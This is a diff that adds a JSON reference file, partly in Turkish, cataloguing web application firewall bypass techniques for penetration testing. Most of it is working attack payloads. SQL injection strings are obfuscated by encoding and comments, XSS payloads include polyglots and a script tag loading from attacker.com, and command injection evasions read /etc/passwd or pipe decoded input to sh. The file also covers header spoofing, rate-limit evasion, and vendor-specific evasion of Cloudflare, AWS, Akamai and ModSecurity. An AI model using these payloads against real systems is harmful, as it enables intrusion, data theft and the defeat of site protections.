@@ -1,0 +1,594 @@
+{
+  "waf_bypass_guide": {
+    "desc": "Comprehensive WAF (Web Application Firewall) bypass techniques for various attack vectors",
+    "category": "WAF Bypass",
+    "type": "General Techniques",
+    "risk": "Critical",
+    "purpose": "Evading Web Application Firewalls during penetration testing"
+  },
+
+  "sqli_waf_bypass": {
+    "desc": "SQL Injection WAF bypass techniques",
+    "category": "WAF Bypass",
+    "type": "SQL Injection",
+    "risk": "Critical",
+    "whitespace_manipulation": {
+      "desc": "Boşluk karakterlerini manipüle ederek bypass",
+      "techniques": [
+        "/**/ yerine boşluk",
+        "Tab karakteri (%09)",
+        "Newline (%0a, %0d)",
+        "Vertical tab (%0b)",
+        "Form feed (%0c)"
+      ],
+      "payloads": [
+        "' OR/**/'1'='1",
+        "' OR/**/1/**/=/**/1--",
+        "' OR%091=1--",
+        "' OR%0a1=1--",
+        "' OR%0d1=1--",
+        "' OR%0b1=1--",
+        "' OR%0c1=1--",
+        "'/**/UNION/**/SELECT/**/1,2,3--"
+      ]
+    },
+    "keyword_obfuscation": {
+      "desc": "SQL keyword'leri obfuscate etme",
+      "case_variation": [
+        "UnIoN SeLeCt",
+        "uNiOn sElEcT"
+      ],
+      "inline_comments": [
+        "UN/**/ION SE/**/LECT",
+        "/*!50000UNION*/ /*!50000SELECT*/",
+        "UNI%0aON%0aSELE%0aCT"
+      ],
+      "concatenation": [
+        "'UNI'||'ON'",
+        "CONCAT('UN','ION')"
+      ]
+    },
+    "encoding_bypass": {
+      "url_encoding": [
+        "%55NION %53ELECT",
+        "%75%6e%69%6f%6e %73%65%6c%65%63%74"
+      ],
+      "double_encoding": [
+        "%2555NION %2553ELECT"
+      ],
+      "unicode_encoding": [
+        "\\u0055NION \\u0053ELECT"
+      ],
+      "hex_encoding": [
+        "0x554e494f4e 0x53454c454354"
+      ]
+    },
+    "equivalent_syntax": {
+      "substring_alternatives": [
+        "SUBSTRING() -> SUBSTR()",
+        "SUBSTRING() -> MID()",
+        "SUBSTRING() -> LEFT()/RIGHT()"
+      ],
+      "comparison_alternatives": [
+        "= -> LIKE",
+        "= -> IN()",
+        "= -> BETWEEN",
+        "> < -> GREATEST()/LEAST()"
+      ],
+      "logical_operators": [
+        "AND -> &&",
+        "OR -> ||",
+        "= -> LIKE"
+      ]
+    },
+    "character_bypass": {
+      "quote_bypass": [
+        "CHAR(97,100,109,105,110)",
+        "0x61646d696e",
+        "admin\\",
+        "\\' OR 1=1--"
+      ],
+      "comma_bypass": [
+        "SUBSTRING(password FROM 1 FOR 1)",
+        "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b"
+      ],
+      "parentheses_bypass": [
+        "' AND password LIKE 'a%",
+        "' AND password REGEXP '^a'"
+      ]
+    },
+    "mysql_specific": {
+      "versioned_comments": [
+        "/*!50000UNION*/",
+        "/*!12345UNION*/",
+        "/*!50000SELECT*/"
+      ],
+      "conditional_comments": [
+        "/*! UNION */",
+        "/*! SELECT */"
+      ]
+    }
+  },
+
+  "xss_waf_bypass": {
+    "desc": "XSS WAF bypass techniques",
+    "category": "WAF Bypass",
+    "type": "XSS",
+    "risk": "Critical",
+    "tag_obfuscation": {
+      "case_variation": [
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "<IMG SRC=x onerror=alert(1)>",
+        "<SvG onload=alert(1)>"
+      ],
+      "nested_tags": [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<<script>alert(1)//<</script>",
+        "<script><script>alert(1)</script>"
+      ],
+      "incomplete_tags": [
+        "<img src=x onerror=alert(1)<",
+        "<iframe SRC='javascript:alert(1)'<",
+        "<script src=//attacker.com/xss.js<"
+      ]
+    },
+    "attribute_bypass": {
+      "special_separators": [
+        "<img/src=x/onerror=alert(1)>",
+        "<img%2Fsrc=x%2Fonerror=alert(1)>",
+        "<img/**/src=x/**/onerror=alert(1)>",
+        "<img%0Dsrc=x%0Donerror=alert(1)>",
+        "<img%0Asrc=x%0Aonerror=alert(1)>",
+        "<img%09src=x%09onerror=alert(1)>"
+      ],
+      "weird_attributes": [
+        "<script x>alert(1)</script>",
+        "<script a='123'>alert(1)</script>",
+        "<script ~~~>alert(1)</script>",
+        "<script/random>alert(1)</script>"
+      ]
+    },
+    "javascript_obfuscation": {
+      "encoding": [
+        "alert(String.fromCharCode(88,83,83))",
+        "eval(atob('YWxlcnQoJ1hTUycp'))",
+        "eval('\\x61\\x6c\\x65\\x72\\x74(1)')",
+        "alert`1`",
+        "Function`alert\\`1\\``()"
+      ],
+      "string_tricks": [
+        "alert('XSS'.split('').join(''))",
+        "alert(/XSS/.source)",
+        "alert?.('XSS')",
+        "window['alert']('XSS')",
+        "self['alert']('XSS')",
+        "this['alert']('XSS')"
+      ],
+      "unicode_escape": [
+        "\\u0061lert(1)",
+        "\\u0061\\u006c\\u0065\\u0072\\u0074(1)"
+      ]
+    },
+    "event_handler_variation": {
+      "alternative_events": [
+        "onerror",
+        "onload",
+        "onmouseover",
+        "onfocus",
+        "onblur",
+        "ontoggle",
+        "onloadstart",
+        "onwheel",
+        "onpointerenter",
+        "onpointerleave"
+      ],
+      "double_events": [
+        "<img src=x onerror=alert(1) onmouseover=alert(1)>",
+        "<img src=x oneonerrorrror=alert(1)>"
+      ]
+    },
+    "context_specific": {
+      "html_context": [
+        "<svg onload=alert(1)>",
+        "<math><mtext><script>alert(1)</script></mtext></math>",
+        "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"
+      ],
+      "javascript_context": [
+        "';alert(1);//",
+        "\";alert(1);//",
+        "'-alert(1)-'",
+        "\"-alert(1)-\""
+      ],
+      "attribute_context": [
+        "\" onload=alert(1) x=\"",
+        "' onload=alert(1) x='",
+        "javascript:alert(1)"
+      ]
+    },
+    "polyglot_payloads": [
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+,
+      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></script><script>alert(String.fromCharCode(88,83,83))</script>",
+      "<?=`$_GET[x]`?>"
+    ]
+  },
+
+  "command_injection_waf_bypass": {
+    "desc": "Command Injection WAF bypass techniques",
+    "category": "WAF Bypass",
+    "type": "Command Injection",
+    "risk": "Critical",
+    "whitespace_bypass": {
+      "IFS_variations": [
+        "${IFS}",
+        "$IFS$9",
+        "$IFS$4",
+        "${IFS//?/}",
+        "${LS_COLORS//?/}"
+      ],
+      "brace_expansion": [
+        "{cat,/etc/passwd}",
+        "{cat${IFS}/etc/passwd}"
+      ],
+      "environment_variables": [
+        "$*",
+        "$@",
+        "$#"
+      ]
+    },
+    "encoding_bypass": {
+      "hex_encoding": [
+        "$(echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
+        "`echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69'`"
+      ],
+      "octal_encoding": [
+        "$(echo -e '\\167\\150\\157\\141\\155\\151')",
+        "`echo -e '\\167\\150\\157\\141\\155\\151'`"
+      ],
+      "base64_encoding": [
+        "echo 'd2hvYW1p' | base64 -d | sh",
+        "bash -c $(echo 'd2hvYW1p' | base64 -d)"
+      ],
+      "unicode_encoding": [
+        "$'\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069'",
+        "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'"
+      ]
+    },
+    "character_insertion": {
+      "quote_bypass": [
+        "w'h'o'a'm'i",
+        "w\"h\"o\"a\"m\"i",
+        "wh``oami"
+      ],
+      "backslash": [
+        "w\\ho\\am\\i",
+        "who\\ami"
+      ],
+      "variable_expansion": [
+        "who$()ami",
+        "who${x}ami"
+      ]
+    },
+    "wildcard_bypass": {
+      "path_wildcards": [
+        "/???/??t /???/??sswd",
+        "/b*/c?t /e??/p??swd",
+        "/[b-a]in/[b-a]ash"
+      ],
+      "command_wildcards": [
+        "w?oami",
+        "who*"
+      ]
+    },
+    "comment_injection": {
+      "inline_comments": [
+        "who#comment%0aami",
+        "who/*comment*/ami"
+      ]
+    }
+  },
+
+  "general_waf_bypass": {
+    "desc": "Genel WAF bypass teknikleri",
+    "category": "WAF Bypass",
+    "type": "General",
+    "risk": "High",
+    "http_parameter_pollution": {
+      "desc": "HPP ile WAF bypass",
+      "examples": [
+        "?id=1&id=' OR 1=1--",
+        "?id=1';--&id=",
+        "?param=value&param=malicious"
+      ]
+    },
+    "http_request_smuggling": {
+      "desc": "Request smuggling ile bypass",
+      "techniques": [
+        "CL.TE vulnerability",
+        "TE.CL vulnerability",
+        "TE.TE vulnerability"
+      ]
+    },
+    "charset_manipulation": {
+      "desc": "Charset encoding ile bypass",
+      "examples": [
+        "Content-Type: text/html; charset=utf-7",
+        "Content-Type: text/html; charset=utf-16",
+        "Content-Type: text/html; charset=ibm037"
+      ]
+    },
+    "content_type_bypass": {
+      "desc": "Content-Type manipulation",
+      "examples": [
+        "application/json -> application/x-www-form-urlencoded",
+        "multipart/form-data boundary manipulation",
+        "application/xml -> text/xml"
+      ]
+    },
+    "http_verb_tampering": {
+      "desc": "HTTP method değiştirerek bypass",
+      "methods": [
+        "GET -> POST",
+        "POST -> PUT",
+        "GET -> HEAD",
+        "POST -> OPTIONS",
+        "Use X-HTTP-Method-Override header"
+      ]
+    },
+    "header_injection": {
+      "desc": "HTTP header injection ile bypass",
+      "headers": [
+        "X-Forwarded-For: 127.0.0.1",
+        "X-Originating-IP: 127.0.0.1",
+        "X-Remote-IP: 127.0.0.1",
+        "X-Remote-Addr: 127.0.0.1",
+        "X-Client-IP: 127.0.0.1",
+        "True-Client-IP: 127.0.0.1"
+      ]
+    },
+    "protocol_downgrade": {
+      "desc": "HTTP version downgrade",
+      "examples": [
+        "HTTP/1.1 -> HTTP/1.0",
+        "HTTP/2 -> HTTP/1.1",
+        "HTTPS -> HTTP (if allowed)"
+      ]
+    },
+    "null_byte_injection": {
+      "desc": "Null byte ile bypass (legacy systems)",
+      "payloads": [
+        "payload%00",
+        "payload\\x00",
+        "payload%00.jpg"
+      ]
+    },
+    "case_sensitivity": {
+      "desc": "Case insensitive sistemlerde bypass",
+      "examples": [
+        "Script -> ScRiPt",
+        "UNION -> UnIoN",
+        "SELECT -> SeLeCt"
+      ]
+    }
+  },
+
+  "rate_limiting_bypass": {
+    "desc": "Rate limiting bypass teknikleri",
+    "category": "WAF Bypass",
+    "type": "Rate Limiting",
+    "risk": "Medium",
+    "techniques": {
+      "ip_rotation": {
+        "desc": "IP rotasyonu ile bypass",
+        "headers": [
+          "X-Forwarded-For",
+          "X-Real-IP",
+          "X-Originating-IP",
+          "CF-Connecting-IP"
+        ]
+      },
+      "user_agent_rotation": {
+        "desc": "User-Agent değiştirerek bypass",
+        "note": "Her istekte farklı User-Agent kullan"
+      },
+      "session_manipulation": {
+        "desc": "Session cookie'leri manipüle etme",
+        "examples": [
+          "Her istekte yeni session",
+          "Session ID değiştirme"
+        ]
+      },
+      "endpoint_variation": {
+        "desc": "Farklı endpoint kullanma",
+        "examples": [
+          "/api/login -> /api/login/",
+          "/api/login -> /API/LOGIN",
+          "/api/login -> /api/../api/login"
+        ]
+      }
+    }
+  },
+
+  "cloudflare_bypass": {
+    "desc": "Cloudflare WAF bypass teknikleri",
+    "category": "WAF Bypass",
+    "type": "Cloudflare Specific",
+    "risk": "High",
+    "techniques": {
+      "origin_ip_discovery": {
+        "desc": "Origin server IP'sini bulup direkt bağlanma",
+        "methods": [
+          "DNS history (SecurityTrails, DNSDumpster)",
+          "SSL certificate CN field",
+          "Subdomain enumeration",
+          "Email headers",
+          "Censys.io / Shodan search"
+        ]
+      },
+      "http2_smuggling": {
+        "desc": "HTTP/2 request smuggling",
+        "note": "Cloudflare HTTP/2 downgrade vulnerabilities"
+      },
+      "cache_poisoning": {
+        "desc": "Cache poisoning attacks",
+        "headers": [
+          "X-Forwarded-Host",
+          "X-Forwarded-Scheme",
+          "X-Original-URL"
+        ]
+      },
+      "rate_limit_bypass": {
+        "desc": "Cloudflare rate limit bypass",
+        "headers": [
+          "CF-Connecting-IP",
+          "X-Forwarded-For"
+        ]
+      }
+    }
+  },
+
+  "aws_waf_bypass": {
+    "desc": "AWS WAF bypass teknikleri",
+    "category": "WAF Bypass",
+    "type": "AWS WAF Specific",
+    "risk": "High",
+    "techniques": {
+      "rule_scoring_manipulation": {
+        "desc": "AWS WAF rule scoring manipulation",
+        "note": "Combine multiple low-score payloads to stay under threshold"
+      },
+      "geo_blocking_bypass": {
+        "desc": "Geo-blocking bypass",
+        "headers": [
+          "CloudFront-Viewer-Country",
+          "X-Forwarded-For"
+        ]
+      },
+      "managed_rules_evasion": {
+        "desc": "AWS Managed Rules bypass",
+        "examples": [
+          "SQLi: Use SQLite specific syntax",
+          "XSS: Use mutation XSS",
+          "LFI: Use PHP wrappers"
+        ]
+      }
+    }
+  },
+
+  "akamai_bypass": {
+    "desc": "Akamai WAF bypass teknikleri",
+    "category": "WAF Bypass",
+    "type": "Akamai Specific",
+    "risk": "High",
+    "techniques": {
+      "header_manipulation": {
+        "desc": "Akamai header manipulation",
+        "headers": [
+          "Akamai-Origin-Hop",
+          "True-Client-IP",
+          "X-Forwarded-For"
+        ]
+      },
+      "cache_key_manipulation": {
+        "desc": "Cache key manipulation",
+        "note": "Manipulate cache keys to bypass WAF"
+      }
+    }
+  },
+
+  "modsecurity_bypass": {
+    "desc": "ModSecurity WAF bypass teknikleri",
+    "category": "WAF Bypass",
+    "type": "ModSecurity",
+    "risk": "High",
+    "techniques": {
+      "crs_version_specific": {
+        "desc": "CRS (Core Rule Set) version specific bypasses",
+        "note": "Her CRS versiyonunun kendine özgü bypass'ları var"
+      },
+      "transformation_bypass": {
+        "desc": "Transformation bypass",
+        "examples": [
+          "URL encoding bypass",
+          "HTML entity bypass",
+          "JS unicode bypass"
+        ]
+      },
+      "anomaly_scoring": {
+        "desc": "Anomaly scoring threshold manipulation",
+        "note": "Stay under anomaly score threshold"
+      }
+    }
+  },
+
+  "waf_detection": {
+    "desc": "WAF detection teknikleri",
+    "category": "WAF Bypass",
+    "type": "Detection",
+    "risk": "Low",
+    "methods": {
+      "response_headers": {
+        "desc": "Response header'lardan WAF tespiti",
+        "headers": [
+          "Server: cloudflare",
+          "X-CDN: Akamai",
+          "Server: AkamaiGHost",
+          "X-Sucuri-ID",
+          "Server: BarracudaHTTP",
+          "X-Mod-Security"
+        ]
+      },
+      "response_codes": {
+        "desc": "WAF specific response codes",
+        "codes": [
+          "403 Forbidden",
+          "406 Not Acceptable",
+          "419 (Cloudflare specific)",
+          "999 (Akamai specific)"
+        ]
+      },
+      "error_pages": {
+        "desc": "WAF specific error pages",
+        "note": "Her WAF'ın kendine özgü error page design'ı var"
+      },
+      "timing_analysis": {
+        "desc": "Response time analysis",
+        "note": "WAF'lı istekler genelde daha yavaş"
+      }
+    }
+  },
+
+  "automation_tools": {
+    "desc": "WAF bypass için automation tool'ları",
+    "category": "WAF Bypass",
+    "type": "Tools",
+    "tools": {
+      "sqlmap": {
+        "desc": "SQL injection automation with WAF bypass",
+        "tamper_scripts": [
+          "--tamper=space2comment",
+          "--tamper=between",
+          "--tamper=randomcase",
+          "--tamper=charencode",
+          "--tamper=apostrophemask",
+          "--tamper=equaltolike"
+        ]
+      },
+      "wafw00f": {
+        "desc": "WAF detection tool",
+        "usage": "wafw00f https://target.com"
+      },
+      "bypass-firewalls-by-DNS-history": {
+        "desc": "Origin IP discovery tool"
+      },
+      "XSStrike": {
+        "desc": "XSS detection with WAF bypass",
+        "features": [
+          "Fuzzing",
+          "WAF detection",
+          "Bruteforce payloads"
+        ]
+      }
+    }
+  }
+}
